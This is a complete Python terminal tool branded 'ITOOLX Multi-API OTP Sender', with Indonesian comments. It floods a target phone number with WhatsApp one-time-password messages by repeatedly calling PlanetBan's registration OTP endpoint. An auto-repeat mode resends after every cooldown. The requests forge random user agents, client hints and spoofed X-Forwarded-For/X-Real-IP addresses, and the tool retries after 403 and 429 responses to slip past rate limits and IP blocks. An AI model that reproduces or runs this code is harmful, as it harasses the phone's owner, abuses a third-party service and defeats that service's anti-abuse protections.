#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
import signal
import random
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich import box
    from rich.rule import Rule
    from rich.text import Text
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich import box
    from rich.rule import Rule
    from rich.text import Text

console = Console()

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

APIS = {
    1: {"name": "PlanetBan",   "desc": "WhatsApp",  "tag": "PLB",
        "cooldown": 60, "color": "bright_red",  "method": "planetban"},
    2: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
        "cooldown": 0,  "color": "bold cyan",   "method": "all"},
}

UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; vivo V25) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OPPO Find X6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; realme GT2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy A52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X6816D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Tecno KG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.163 Mobile Safari/537.36",
]

SEC_CH_BRANDS = [
    '"Not;A=Brand";v="8","Chromium";v="{v}","Google Chrome";v="{v}"',
    '"Chromium";v="{v}","Not_A Brand";v="8","Google Chrome";v="{v}"',
    '"Google Chrome";v="{v}","Chromium";v="{v}","Not;A=Brand";v="99"',
    '"Not/A)Brand";v="8","Chromium";v="{v}","Google Chrome";v="{v}"',
]

FAKE_IPS = [
    lambda: f"36.{random.randint(64,95)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"114.{random.randint(120,130)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"180.{random.randint(240,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"103.{random.randint(1,50)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"202.{random.randint(60,80)}.{random.randint(0,255)}.{random.randint(1,254)}",
]

def rand_ua() -> str:
    return random.choice(UA_POOL)

def rand_ip() -> str:
    return random.choice(FAKE_IPS)()

def rand_sec_ch(ver: int = None) -> str:
    v = ver or random.choice([114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128])
    return random.choice(SEC_CH_BRANDS).replace("{v}", str(v))

BANNER = """\
[bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
 ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
 ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
 ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
 ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
 ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝[/bold cyan]"""

# ══════════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════════

cooldown_tracker: dict = {}   # { phone: { method: sent_at } }

# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════

def get_rem(phone: str, method: str, cd: int) -> int:
    sent = cooldown_tracker.get(phone, {}).get(method)
    return 0 if sent is None else max(0, int(cd - (time.time() - sent)))

def set_cd(phone: str, method: str):
    cooldown_tracker.setdefault(phone, {})[method] = time.time()

def was_sent(phone: str, method: str) -> bool:
    return method in cooldown_tracker.get(phone, {})

def fmt_rem(s: int) -> str:
    m, sc = divmod(s, 60)
    return f"{m}m{sc:02d}s" if m else f"{sc}s"

def is_ok(code: int) -> bool:
    return code in (200, 201, 202)

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def flush_stdin():
    try:
        import termios
        termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except Exception:
        pass

def validate_phone(raw: str) -> str:
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+62"): return "62" + p[3:]
    if p.startswith("08"):  return "628" + p[2:]
    if p.startswith("8"):   return "62" + p
    return p

def status_fmt(code: int):
    if is_ok(code):  return "SUCCESS", "bold green"
    if code == 0:    return "ERROR",   "bold red"
    return f"HTTP {code}", "bold yellow"

def clean_exit():
    clr()
    console.print(Align.center(Panel(
        "[bold white]Sampai jumpa.[/bold white]\n"
        "[dim]ITOOLX  Termux Edition[/dim]",
        border_style="cyan", padding=(1, 4),
    )))
    sys.exit(0)

# ══════════════════════════════════════════════════════════════
#  HEADERS — randomized fingerprint tiap request
# ══════════════════════════════════════════════════════════════

def _h(**extra) -> dict:
    ua  = rand_ua()
    ip  = rand_ip()
    sch = rand_sec_ch()
    # ekstrak versi chrome dari UA kalau ada
    plat = '"Android"' if "Android" in ua else '"iOS"' if "iPhone" in ua else '"Android"'
    base = {
        "User-Agent":         ua,
        "Accept":             "application/json, text/plain, */*",
        "Accept-Encoding":    "gzip, deflate, br",
        "Accept-Language":    random.choice([
            "id-ID,id;q=0.9,en-US;q=0.8",
            "id-ID,id;q=0.9",
            "id;q=0.9,en;q=0.8",
        ]),
        "Connection":         "keep-alive",
        "sec-ch-ua":          sch,
        "sec-ch-ua-mobile":   "?1",
        "sec-ch-ua-platform": plat,
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-site",
        "X-Forwarded-For":    ip,
        "X-Real-IP":          ip,
    }
    base.update(extra)
    return base

# ══════════════════════════════════════════════════════════════
#  REQUEST WRAPPER — smart retry on 403/429
# ══════════════════════════════════════════════════════════════

# Kata-kata dalam body 403 yang artinya rate-limit server (bukan IP block)
_RATE_LIMIT_HINTS = ("please wait", "wait at least", "too many", "rate limit",
                     "terlalu banyak", "tunggu", "cooldown")

def _is_server_ratelimit(body: str) -> bool:
    b = body.lower()
    return any(h in b for h in _RATE_LIMIT_HINTS)

def safe_post(url: str, headers: dict, data=None, files=None,
              timeout: int = 15, retries: int = 3) -> dict:
    last_code = 0
    last_body = ""
    for attempt in range(retries):
        try:
            # regenerasi fingerprint tiap attempt
            hdrs = dict(headers)
            hdrs["X-Forwarded-For"] = rand_ip()
            hdrs["X-Real-IP"]       = hdrs["X-Forwarded-For"]
            hdrs["User-Agent"]      = rand_ua()
            hdrs["sec-ch-ua"]       = rand_sec_ch()

            if attempt > 0:
                time.sleep(random.uniform(1.0, 2.5) * attempt)

            if files:
                r = requests.post(url, headers=hdrs, files=files, timeout=timeout)
            else:
                r = requests.post(url, headers=hdrs, data=data, timeout=timeout)

            last_code = r.status_code
            last_body = r.text

            # sukses → langsung return
            if is_ok(r.status_code):
                return {"status": r.status_code, "body": r.text}

            # 429 → baca Retry-After, tunggu, lalu retry
            if r.status_code == 429:
                wait = float(r.headers.get("Retry-After",
                             random.uniform(2, 5) * (attempt + 1)))
                time.sleep(min(wait, 12))
                continue

            # 403 → cek apakah server rate-limit (per nomor HP) atau IP block
            if r.status_code == 403:
                if _is_server_ratelimit(r.text):
                    # rate-limit per nomor → retry tidak akan membantu, return langsung
                    return {"status": r.status_code, "body": r.text}
                # mungkin IP/fingerprint block → coba sekali lagi dengan fingerprint baru
                time.sleep(random.uniform(0.8, 2.0))
                continue

            # kode lain → langsung return
            return {"status": r.status_code, "body": r.text}

        except requests.exceptions.Timeout:
            last_code = 0
            last_body = "Timeout"
            time.sleep(1.0)
        except Exception as e:
            last_code = 0
            last_body = str(e)
            break

    return {"status": last_code, "body": last_body}

# ══════════════════════════════════════════════════════════════
#  API FUNCTIONS
# ══════════════════════════════════════════════════════════════

def send_planetban(phone: str) -> dict:
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    pb  = "0" + num[2:]
    return safe_post(
        "https://api.planetban.com/website/customer/request-otp",
        headers=_h(**{
            "Content-Type": "application/json",
            "origin":  "https://planetban.com",
            "referer": "https://planetban.com/",
            "x-requested-with": "com.chimbori.hermitcrab",
        }),
        data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
    )

def dispatch(method: str, phone: str) -> dict:
    if method == "planetban": return send_planetban(phone)
    return {}

# ══════════════════════════════════════════════════════════════
#  MENU
# ══════════════════════════════════════════════════════════════

def render_menu(phone: str = "") -> Table:
    t = Table(
        title=(
            "[bold cyan]PILIH TARGET[/bold cyan]"
            + (f"  [dim]-> {phone}[/dim]" if phone else "")
        ),
        box=box.DOUBLE_EDGE, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("No",  width=4,  justify="center", style="bold white")
    t.add_column("Tag", width=5,  justify="center")
    t.add_column("API", width=16, style="bold")
    t.add_column("Via", width=10)
    t.add_column("CD",  width=9,  justify="center")

    for num, api in APIS.items():
        cd_txt = "[dim]each[/dim]" if api["method"] == "all" else f"[dim]{api['cooldown']}s[/dim]"
        t.add_row(
            f"[cyan]{num}[/cyan]",
            f"[{api['color']}]{api['tag']}[/{api['color']}]",
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{api['desc']}[/dim]",
            cd_txt,
        )
    t.add_row("[red]0[/red]", "[red]EXIT[/red]", "[red]Keluar[/red]", "", "")
    return t

def print_home(phone: str = ""):
    clr()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(
        "[bold white]Multi-API OTP Sender[/bold white]  "
        "[dim]by[/dim] [bold cyan]ITOOLX[/bold cyan]  [dim]Termux Edition[/dim]",
        border_style="cyan", padding=(0, 3),
    )))
    console.print()
    console.print(Align.center(render_menu(phone)))
    console.print()

# ══════════════════════════════════════════════════════════════
#  LIVE COOLDOWN PANEL
# ══════════════════════════════════════════════════════════════

def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
    t = Table(
        box=box.SIMPLE, show_header=True, show_lines=False,
        padding=(0, 1), header_style="dim",
    )
    t.add_column("API",      width=16)
    t.add_column("Progress", width=16)
    t.add_column("Sisa",     width=8,  justify="right")
    t.add_column("Unlock",   width=9,  justify="center")
    t.add_column("Status",   width=7,  justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        rem  = get_rem(phone, api["method"], api["cooldown"])
        sent = cooldown_tracker.get(phone, {}).get(api["method"])
        cd   = api["cooldown"]

        if rem > 0 and sent:
            fill  = max(0, int((cd - rem) / cd * 14))
            bar   = f"[cyan]{'|'*fill}[/cyan][dim]{'.'*(14-fill)}[/dim]"
            sisa  = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
            ul    = datetime.fromtimestamp(sent + cd).strftime("%H:%M:%S")
            stat  = "[red] WAIT [/red]"
        else:
            bar   = "[bold green]" + "|" * 14 + "[/bold green]"
            sisa  = "[bold green]  0s[/bold green]"
            ul    = "[dim]  --   [/dim]"
            stat  = "[bold green] READY [/bold green]"

        t.add_row(
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            bar, sisa, f"[dim]{ul}[/dim]", stat,
        )

    now = datetime.now().strftime("%H:%M:%S")
    hdr = title or f"[bold yellow]COOLDOWN  {phone}[/bold yellow]"
    return Panel(t, title=hdr, subtitle=f"[dim]{now}[/dim]",
                 border_style="yellow", padding=(0, 1))

# ══════════════════════════════════════════════════════════════
#  LIVE CD WAIT
# ══════════════════════════════════════════════════════════════

def wait_until_ready(phone: str, targets: list):
    """Blokir sampai semua target ready. Ctrl+C di sini → propagate ke session."""
    def any_locked():
        return any(get_rem(phone, a["method"], a["cooldown"]) > 0
                   for a in targets if a["method"] != "all")

    if not any_locked():
        return

    try:
        with Live(build_cd_panel(phone, targets),
                  console=console, refresh_per_second=2,
                  transient=True) as live:
            while any_locked():
                time.sleep(0.5)
                live.update(build_cd_panel(phone, targets))
    except KeyboardInterrupt:
        raise   # biarkan session yang tangkap, bukan sini

    flush_stdin()

# ══════════════════════════════════════════════════════════════
#  Y / R / N  PROMPT
# ══════════════════════════════════════════════════════════════

def ask_yrn(before_send: bool = False) -> str:
    """
    before_send=True  → prompt sebelum kirim pertama.
    before_send=False → prompt setelah result + CD selesai.
    Ctrl+C di sini = kembali ke menu (return 'n').
    """
    flush_stdin()
    if before_send:
        desc = (
            "  [bold cyan]Y[/bold cyan]  Kirim sekali\n"
            "  [bold cyan]R[/bold cyan]  Auto-repeat  (otomatis kirim tiap CD habis)\n"
            "  [bold cyan]N[/bold cyan]  Batal, kembali ke menu"
        )
        title = "[bold cyan]PILIH MODE[/bold cyan]"
        border = "cyan"
    else:
        desc = (
            "  [bold cyan]Y[/bold cyan]  Kirim sekali lagi\n"
            "  [bold cyan]R[/bold cyan]  Auto-repeat  (otomatis kirim tiap CD habis)\n"
            "  [bold cyan]N[/bold cyan]  Stop, kembali ke menu"
        )
        title = "[bold green]SIAP[/bold green]"
        border = "green"

    console.print(Panel(desc, title=title, border_style=border, padding=(0, 2)))
    while True:
        try:
            flush_stdin()
            raw = Prompt.ask("[bold cyan]  >[/bold cyan]", default="y").strip().lower()
            if raw in ("y", "r", "n"):
                return raw
        except (KeyboardInterrupt, EOFError):
            return "n"

# ══════════════════════════════════════════════════════════════
#  RESULT PANELS  (Y mode)
# ══════════════════════════════════════════════════════════════

def show_result(api: dict, phone: str, res: dict, round_n: int):
    clr()
    code      = res.get("status", 0)
    body      = res.get("body", "")
    prev      = body[:100].replace("\n", " ") + ("..." if len(body) > 100 else "")
    lbl, col  = status_fmt(code)

    console.print(Align.center(Panel(
        f"  [{api['color']}]{api['tag']}  {api['name']}[/{api['color']}]\n\n"
        f"  [bold white]Nomor  [/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
        f"  [bold white]Round  [/bold white] {round_n}\n"
        f"  [bold white]HTTP   [/bold white] [{col}]{code}   {lbl}[/{col}]\n"
        f"  [bold white]Waktu  [/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n\n"
        f"  [dim]{prev}[/dim]",
        title=f"[{col}] {lbl} [/{col}]",
        border_style="green" if is_ok(code) else "red",
        padding=(1, 2),
    )))
    console.print()


def show_all_results(phone: str, results: list, round_n: int):
    clr()
    t = Table(
        title=f"[bold cyan]ALL TARGETS   Round {round_n}   {phone}[/bold cyan]",
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("Tag",    width=5,  justify="center")
    t.add_column("API",    width=16)
    t.add_column("HTTP",   width=6,  justify="center")
    t.add_column("Status", width=10)
    t.add_column("Jam",    width=9,  justify="center")

    for item in results:
        lbl, col = status_fmt(item["status"])
        t.add_row(
            f"[{item['color']}]{item['tag']}[/{item['color']}]",
            f"[{item['color']}]{item['name']}[/{item['color']}]",
            f"[{col}]{item['status']}[/{col}]",
            f"[{col}]{lbl}[/{col}]",
            f"[dim]{item['time']}[/dim]",
        )
    console.print(Align.center(t))
    console.print()

# ══════════════════════════════════════════════════════════════
#  R-MODE LIVE TABLE  — tabel sama seperti Y, update in-place
#  stats  : { method: {"ok": int, "err": int} }
# ══════════════════════════════════════════════════════════════

def build_r_live(phone: str, targets: list, stats: dict,
                 last_row: dict, round_counts: dict, title: str) -> Panel:
    """
    Tabel utama mirip show_all_results + kolom OK/ERR count.
    Bawahnya: CD bar per target.
    last_row: { method: {"status": int, "time": str} } — hasil terakhir tiap target.
    """
    # ── tabel hasil
    t = Table(
        title=title,
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("Tag",    width=5,  justify="center")
    t.add_column("API",    width=14)
    t.add_column("Round",  width=6,  justify="center")
    t.add_column("HTTP",   width=6,  justify="center")
    t.add_column("Status", width=10)
    t.add_column("OK",     width=5,  justify="center")
    t.add_column("ERR",    width=5,  justify="center")
    t.add_column("Jam",    width=9,  justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        m    = api["method"]
        lr   = last_row.get(m, {})
        code = lr.get("status", 0)
        ts   = lr.get("time", "--:--:--")
        rn   = round_counts.get(m, 0)
        lbl, col = status_fmt(code) if rn > 0 else ("--", "dim")

        ok_c  = stats.get(m, {}).get("ok",  0)
        err_c = stats.get(m, {}).get("err", 0)

        ok_txt  = f"[bold green]{ok_c}[/bold green]"  if ok_c  else "[dim]0[/dim]"
        err_txt = f"[bold red]{err_c}[/bold red]"     if err_c else "[dim]0[/dim]"
        http_tx = f"[{col}]{code}[/{col}]"            if rn > 0 else "[dim]--[/dim]"

        t.add_row(
            f"[{api['color']}]{api['tag']}[/{api['color']}]",
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{rn}[/dim]" if rn > 0 else "[dim]--[/dim]",
            http_tx,
            f"[{col}]{lbl}[/{col}]",
            ok_txt, err_txt,
            f"[dim]{ts}[/dim]",
        )

    # ── CD bar
    tcd = Table(box=box.SIMPLE, show_header=False, padding=(0, 1),
                show_lines=False)
    tcd.add_column("API",  width=14)
    tcd.add_column("Bar",  width=16)
    tcd.add_column("Sisa", width=8, justify="right")
    tcd.add_column("St",   width=8, justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        rem  = get_rem(phone, api["method"], api["cooldown"])
        sent = cooldown_tracker.get(phone, {}).get(api["method"])
        cd   = api["cooldown"]

        if rem > 0 and sent:
            fill = max(0, int((cd - rem) / cd * 14))
            bar  = f"[cyan]{'|'*fill}[/cyan][dim]{'.'*(14-fill)}[/dim]"
            sisa = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
            stat = "[red]WAIT[/red]"
        else:
            bar  = "[bold green]" + "|" * 14 + "[/bold green]"
            sisa = "[bold green]  0s[/bold green]"
            stat = "[bold green]READY[/bold green]"

        tcd.add_row(
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            bar, sisa, stat,
        )

    now = datetime.now().strftime("%H:%M:%S")
    from rich.console import Group
    body = Group(t, Rule(style="dim"), tcd)
    return Panel(body,
                 subtitle=f"[dim]{now}   Ctrl+C = menu[/dim]",
                 border_style="yellow", padding=(0, 1))

# ══════════════════════════════════════════════════════════════
#  SESSION — SINGLE  (Y mode)
# ══════════════════════════════════════════════════════════════

def session_single(api: dict, phone: str, first_ans: str):
    """first_ans sudah diketahui (y atau r) sebelum kirim pertama.
    Ctrl+C di mana saja di dalam sini → kembali ke menu utama."""
    round_n = 0

    if first_ans == "r":
        try:
            session_single_r(api, phone, round_n)
        except KeyboardInterrupt:
            pass
        return

    # Y mode
    try:
        while True:
            round_n += 1
            with console.status(
                f"[bold cyan]Mengirim  {api['name']}...", spinner="dots",
            ):
                res = dispatch(api["method"], phone)
            set_cd(phone, api["method"])

            show_result(api, phone, res, round_n)

            wait_until_ready(phone, [api])

            ans = ask_yrn(before_send=False)
            if ans == "n":
                return
            if ans == "r":
                session_single_r(api, phone, round_n)
                return
    except KeyboardInterrupt:
        pass  # balik ke menu

# ══════════════════════════════════════════════════════════════
#  SESSION — SINGLE  (R mode)  — in-place Live tabel
# ══════════════════════════════════════════════════════════════

def session_single_r(api: dict, phone: str, start_round: int):
    targets      = [api]
    round_counts = {api["method"]: start_round}
    stats        = {api["method"]: {"ok": 0, "err": 0}}
    last_row     = {}
    title        = f"[bold yellow]AUTO-REPEAT  {api['tag']}  {phone}[/bold yellow]"

    try:
        with Live(console=console, refresh_per_second=4, transient=True) as live:
            while True:
                rn = round_counts[api["method"]] + 1
                round_counts[api["method"]] = rn

                live.stop()
                with console.status(
                    f"[bold cyan]Auto  {api['name']}  #{rn}...", spinner="dots",
                ):
                    res = dispatch(api["method"], phone)
                set_cd(phone, api["method"])
                live.start()

                code = res.get("status", 0)
                if is_ok(code):
                    stats[api["method"]]["ok"]  += 1
                else:
                    stats[api["method"]]["err"] += 1

                last_row[api["method"]] = {
                    "status": code,
                    "time":   datetime.now().strftime("%H:%M:%S"),
                }
                live.update(build_r_live(phone, targets, stats, last_row,
                                         round_counts, title))

                while get_rem(phone, api["method"], api["cooldown"]) > 0:
                    time.sleep(0.25)
                    live.update(build_r_live(phone, targets, stats, last_row,
                                             round_counts, title))
    except KeyboardInterrupt:
        pass  # balik ke menu

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL  (Y mode)
# ══════════════════════════════════════════════════════════════

def session_all(phone: str, first_ans: str):
    """Ctrl+C di mana saja → kembali ke menu utama."""
    targets = [v for v in APIS.values() if v["method"] != "all"]
    round_n = 0

    if first_ans == "r":
        try:
            session_all_r(phone, targets, round_n)
        except KeyboardInterrupt:
            pass
        return

    try:
        while True:
            round_n += 1
            results = []
            for api in targets:
                with console.status(
                    f"[bold cyan]->  {api['name']}...", spinner="aesthetic",
                ):
                    t_str = datetime.now().strftime("%H:%M:%S")
                    res   = dispatch(api["method"], phone)
                    set_cd(phone, api["method"])
                results.append({
                    "name":   api["name"], "tag": api["tag"],
                    "color":  api["color"],
                    "status": res.get("status", 0), "time": t_str,
                })
                time.sleep(0.15)

            show_all_results(phone, results, round_n)

            wait_until_ready(phone, targets)

            ans = ask_yrn(before_send=False)
            if ans == "n":
                return
            if ans == "r":
                session_all_r(phone, targets, round_n)
                return
    except KeyboardInterrupt:
        pass  # balik ke menu

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL  (R mode)  — in-place Live tabel
# ══════════════════════════════════════════════════════════════

def session_all_r(phone: str, targets: list, initial_round: int = 0):
    """Ctrl+C → raise KeyboardInterrupt → ditangkap session_all → balik ke menu."""
    round_counts = {a["method"]: initial_round for a in targets}
    stats        = {a["method"]: {"ok": 0, "err": 0} for a in targets}
    last_row     = {}
    pending: set = {a["method"] for a in targets
                    if not was_sent(phone, a["method"])}
    title = f"[bold yellow]AUTO-REPEAT  ALL  {phone}[/bold yellow]"

    def needs_send(api: dict) -> bool:
        if api["method"] in pending:
            return True
        return (was_sent(phone, api["method"]) and
                get_rem(phone, api["method"], api["cooldown"]) == 0)

    with Live(console=console, refresh_per_second=4, transient=True) as live:
        while True:
            ready = [a for a in targets if needs_send(a)]

            if ready:
                for api in ready:
                    pending.discard(api["method"])
                    round_counts[api["method"]] += 1
                    rn = round_counts[api["method"]]

                    live.stop()
                    with console.status(
                        f"[bold cyan]->  {api['name']}  #{rn}", spinner="dots",
                    ):
                        res = dispatch(api["method"], phone)
                    set_cd(phone, api["method"])
                    live.start()

                    code = res.get("status", 0)
                    if is_ok(code):
                        stats[api["method"]]["ok"]  += 1
                    else:
                        stats[api["method"]]["err"] += 1

                    last_row[api["method"]] = {
                        "status": code,
                        "time":   datetime.now().strftime("%H:%M:%S"),
                    }
                    time.sleep(0.1)

            live.update(build_r_live(phone, targets, stats, last_row,
                                     round_counts, title))
            time.sleep(0.25)
    # KeyboardInterrupt tidak ditangkap di sini → propagate ke session_all

# ══════════════════════════════════════════════════════════════
#  INPUT HELPER
# ══════════════════════════════════════════════════════════════

def ask_phone(current: str = "") -> str:
    """Ctrl+C di sini → raise KeyboardInterrupt → ditangkap main() → continue ke menu."""
    hint = (f" [dim](Enter = {current})[/dim]"
            if current else " [dim](08xxx / 628xxx)[/dim]")
    while True:
        flush_stdin()
        raw = Prompt.ask(f"[bold cyan]  >[/bold cyan] Nomor{hint}")
        if raw.strip() == "" and current:
            return current
        p = validate_phone(raw)
        if len(p) >= 10:
            return p
        console.print("[bold red]  Nomor tidak valid.[/bold red]")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    # Tidak pakai global SIGINT handler — Ctrl+C dikelola per konteks:
    #   di menu utama  → exit
    #   di dalam sesi  → kembali ke menu
    signal.signal(signal.SIGINT, signal.SIG_DFL)

    current_phone = ""

    while True:
        print_home(current_phone)

        # ── Prompt menu utama: Ctrl+C = exit
        try:
            flush_stdin()
            raw    = Prompt.ask("[bold cyan]  >[/bold cyan] Pilih  [dim](0 = exit)[/dim]")
            choice = int(raw.strip())
        except (ValueError, EOFError):
            time.sleep(0.3)
            continue
        except KeyboardInterrupt:
            clean_exit()

        if choice == 0:
            clean_exit()

        if choice not in APIS:
            time.sleep(0.3)
            continue

        api = APIS[choice]

        # ── Input nomor: Ctrl+C = kembali ke menu
        clr()
        console.print(Align.center(Panel(
            f"[{api['color']}]{api['tag']}  {api['name']}[/{api['color']}]",
            border_style="cyan", padding=(0, 4),
        )))
        console.print()
        try:
            current_phone = ask_phone(current_phone)
        except KeyboardInterrupt:
            continue
        console.print()

        targets = ([v for v in APIS.values() if v["method"] != "all"]
                   if api["method"] == "all" else [api])

        # ── Cek CD awal: Ctrl+C = kembali ke menu
        locked = [a for a in targets
                  if get_rem(current_phone, a["method"], a["cooldown"]) > 0]

        if locked:
            console.print(Align.center(
                build_cd_panel(current_phone, targets,
                               title="[bold red]COOLDOWN AKTIF[/bold red]")
            ))
            console.print(
                "\n  [bold cyan]Y[/bold cyan] = Tunggu CD selesai lalu pilih mode"
                "\n  [bold cyan]N[/bold cyan] = Batal\n"
            )
            try:
                flush_stdin()
                ans = Prompt.ask("[bold cyan]  >[/bold cyan]",
                                 default="y").strip().lower()
            except (KeyboardInterrupt, EOFError):
                continue
            if ans != "y":
                continue
            try:
                wait_until_ready(current_phone, targets)
            except KeyboardInterrupt:
                continue

        # ── Pilih Y/R/N SEBELUM kirim pertama (Ctrl+C = "n" = menu)
        first_ans = ask_yrn(before_send=True)
        if first_ans == "n":
            continue

        # ── Mulai sesi — Ctrl+C di dalam sesi = kembali ke sini → loop menu
        if api["method"] == "all":
            session_all(current_phone, first_ans)
        else:
            session_single(api, current_phone, first_ans)

        time.sleep(0.3)


if __name__ == "__main__":
    main()
